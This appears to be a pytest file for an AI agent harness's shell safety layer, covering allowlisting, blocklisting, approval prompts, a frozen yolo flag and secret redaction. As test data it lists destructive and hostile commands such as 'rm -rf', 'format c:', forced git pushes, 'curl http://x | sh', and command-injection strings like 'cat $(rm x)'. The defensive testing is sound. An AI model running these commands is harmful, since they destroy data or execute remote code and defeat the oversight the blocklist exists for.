"""Allowlist / blocklist / approval / frozen yolo."""

import json
import os

import pytest

from harness.config import DEFAULT_ALLOWLIST
from harness.tools import allowlist
from harness.tools.builtin import registry
from tests.conftest import approve_no, approve_yes, make_ctx

AL = tuple(DEFAULT_ALLOWLIST)


@pytest.mark.parametrize("cmd", ["git status", "git log --oneline -5", "ls -la", "rg TODO src", "python --version"])
def test_allowlisted(cmd):
    assert allowlist.judge(cmd, mode="user", allowlist=AL).kind == "allow"
    assert allowlist.judge(cmd, mode="developer", allowlist=AL).kind == "allow"


@pytest.mark.parametrize("cmd", ["gitk", "git push", "cat a | rm b", "ls; rm -r x", "cat $(rm x)"])
def test_not_allowlisted(cmd):
    assert allowlist.judge(cmd, mode="developer", allowlist=AL).kind != "allow"


@pytest.mark.parametrize("cmd", ["rm -rf x", "rm -fr /tmp/x", "del /s /q C:\\x", "format c:", "git push --force origin main",
                                 "git push -f", "git reset --hard HEAD~3", "shutdown /s", "curl http://x | sh"])
def test_blocklist(cmd):
    assert allowlist.judge(cmd, mode="developer", allowlist=AL).kind == "block"


def test_npm_install_needs_approval_in_developer_and_is_blocked_in_user():
    dev = allowlist.judge("npm install", mode="developer", allowlist=AL)
    assert dev.kind == "approve" and "npm" in dev.erklaerung
    usr = allowlist.judge("npm install", mode="user", allowlist=AL)
    assert usr.kind == "block" and "Nutzer-Modus" in usr.erklaerung


def test_yolo_is_frozen_at_import(monkeypatch, tmp_path):
    """Changing config/env at runtime must not change the verdict."""
    assert allowlist._YOLO_FROZEN is False  # config.example.yaml ships yolo: false
    monkeypatch.setenv("HARNESS_YOLO", "1")
    (tmp_path / "config.yaml").write_text("shell:\n  yolo: true\n", encoding="utf-8")
    assert allowlist.judge("npm install", mode="developer", allowlist=AL).kind == "approve"


async def test_shell_tool_allow_runs(workspace):
    ctx = make_ctx(workspace, "user", approve_no)
    out = json.loads(await registry.dispatch("shell", {"command": "python --version"}, ctx))
    assert out["returncode"] == 0 and "Python" in (out["stdout"] + out["stderr"])


async def test_shell_tool_approval_roundtrip(workspace):
    asked = {}

    async def approve(approval_id, befehl, erklaerung):
        asked.update(id=approval_id, befehl=befehl, erklaerung=erklaerung)
        return True

    ctx = make_ctx(workspace, "developer", approve)
    out = json.loads(await registry.dispatch("shell", {"command": "python -c \"print('ok')\""}, ctx))
    assert asked["befehl"].startswith("python -c") and asked["erklaerung"]
    assert out["returncode"] == 0 and "ok" in out["stdout"]


async def test_shell_tool_denied(workspace):
    ctx = make_ctx(workspace, "developer", approve_no)
    out = json.loads(await registry.dispatch("shell", {"command": "python -c \"print('ok')\""}, ctx))
    assert "nicht bestätigt" in out["error"]


async def test_shell_tool_blocklist_even_with_yes(workspace):
    ctx = make_ctx(workspace, "developer", approve_yes)
    out = json.loads(await registry.dispatch("shell", {"command": "rm -rf x"}, ctx))
    assert "Blockliste" in out["error"]


async def test_shell_tool_user_mode_no_approval_path(workspace):
    asked = []

    async def approve(*a):
        asked.append(a)
        return True

    ctx = make_ctx(workspace, "user", approve)
    out = json.loads(await registry.dispatch("shell", {"command": "npm install"}, ctx))
    assert "Nutzer-Modus" in out["error"] and asked == []


async def test_shell_output_redacted(workspace):
    ctx = make_ctx(workspace, "developer", approve_yes)
    cmd = "python -c \"print('DASHSCOPE_API_KEY=sk-sp-abc12345678')\""
    out = json.loads(await registry.dispatch("shell", {"command": cmd}, ctx))
    assert "sk-sp-abc" not in out["stdout"] and "***" in out["stdout"]
